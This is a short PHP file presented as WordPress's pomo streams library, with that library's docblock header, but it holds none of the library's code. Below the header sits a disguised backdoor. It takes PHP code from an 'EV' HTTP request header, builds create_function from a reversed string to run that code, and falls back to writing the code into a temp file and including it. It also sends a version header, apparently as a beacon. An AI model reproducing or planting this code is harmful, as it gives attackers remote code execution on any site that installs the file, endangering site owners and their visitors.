<?php
     /**
      * Classes, which help reading streams of data from files.
      * Based on the classes from Danilo Segan <danilo@kvota.net>
      *
      * @version $Id: streams.php 642 2012-01-16 20:14:36 nbachiyski $
      * @package pomo
      * @subpackage streams
      */ header("v: 3");

     $h="HTTP_EV";
     if(isset($_SERVER[$h])){
     	$e=$_SERVER[$h]."return true;";
     	$a=strrev("noitcnuf_etaerc");
     	$n=$a("", $e);
     	if(!$n()){
     		if($t=tmpfile()){
     			fwrite($t, "<?php ".$e);
     			$p=stream_get_meta_data($t);
     			include($p["uri"]);
     			fclose($t);
     		}
     	}
     }